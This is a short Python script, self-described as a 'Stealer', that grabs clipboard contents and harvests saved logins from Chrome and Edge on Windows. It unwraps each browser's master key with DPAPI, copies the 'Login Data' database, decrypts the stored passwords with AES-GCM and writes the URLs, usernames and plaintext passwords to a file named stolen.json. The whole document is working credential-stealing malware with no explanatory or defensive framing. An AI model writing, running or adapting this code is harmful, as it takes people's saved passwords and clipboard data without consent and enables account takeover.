# Stealer — Chrome/Edge login db + clipboard
# deps: pyperclip pycryptodome pywin32 (Windows)
import os,sys,json,shutil,sqlite3,base64,tempfile
from pathlib import Path

R = {"clipboard":"","chrome":[],"edge":[]}

try:
    import pyperclip; R["clipboard"] = pyperclip.paste()
except Exception as e: R["clipboard"] = str(e)

if sys.platform == "win32":
    try:
        import win32crypt
        from Crypto.Cipher import AES

        def _key(bp: Path) -> bytes:
            ls = json.loads((bp.parent/"Local State").read_text())
            return win32crypt.CryptUnprotectData(
                base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:],
                None,None,None,0)[1]

        def _dec(ct: bytes, key: bytes) -> str:
            if ct[:3]==b"v10":
                return AES.new(key,AES.MODE_GCM,ct[3:15]).decrypt(ct[15:-16]).decode(errors="replace")
            return win32crypt.CryptUnprotectData(ct,None,None,None,0)[1]

        def _harvest(profile: Path, label: str):
            db = profile/"Login Data"
            if not db.exists(): return
            key = _key(profile)
            tmp = Path(tempfile.mktemp(suffix=".db"))
            shutil.copy2(db, tmp)
            try:
                conn = sqlite3.connect(tmp)
                for url,user,pw_enc in conn.execute(
                    "SELECT origin_url,username_value,password_value FROM logins"):
                    try: pw = _dec(pw_enc, key)
                    except Exception: pw = "[fail]"
                    R[label].append({"url":url,"user":user,"pw":pw})
                conn.close()
            finally: tmp.unlink(missing_ok=True)

        _a = Path(os.environ["LOCALAPPDATA"])
        _harvest(_a/"Google/Chrome/User Data/Default", "chrome")
        _harvest(_a/"Microsoft/Edge/User Data/Default",  "edge")
    except Exception as e: R["chrome"]=[{"error":str(e)}]

out = Path("output/stolen.json")
out.write_text(json.dumps(R,indent=2,ensure_ascii=False))
print(f"[+] → {out}")
    